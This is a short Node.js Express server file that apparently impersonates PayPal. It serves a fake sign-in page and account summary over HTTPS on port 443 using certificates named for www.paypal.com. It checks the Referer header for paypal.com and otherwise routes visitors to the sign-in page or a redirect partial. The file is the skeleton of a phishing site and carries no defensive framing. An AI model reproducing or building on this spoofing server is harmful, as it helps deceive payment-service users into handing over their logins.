import express from 'express'
import fs from 'node:fs'
import https from 'node:https'
import { abs } from './util.js'

const app = express()

app.use(express.static('./public'))

app.get('/myaccount/summary', (req, res) => {
  res.sendFile(abs('./pages/index.html'))
})

app.get('/signin', (req, res) => {
  res.sendFile(abs('./pages/login.html'))
})

app.use((req, res) => {
  const referer = req.get('referer')
  const fromPaypal = referer && referer.includes('paypal.com')

  if (!fromPaypal) {
    res.sendFile(abs('./partials/redirect.html'))
    return
  }

  const originalUrl = `https://${req.get('host')}${req.originalUrl}`
  const returnUri = encodeURIComponent(originalUrl)

  setTimeout(() => res.redirect(`/signin?returnUri=${returnUri}`), 1000)
})

const options = {
  cert: fs.readFileSync('./www.paypal.com+3.pem'),
  key: fs.readFileSync('./www.paypal.com+3-key.pem'),
}

https.createServer(options, app).listen(443, () => {
  console.log('Running')
})
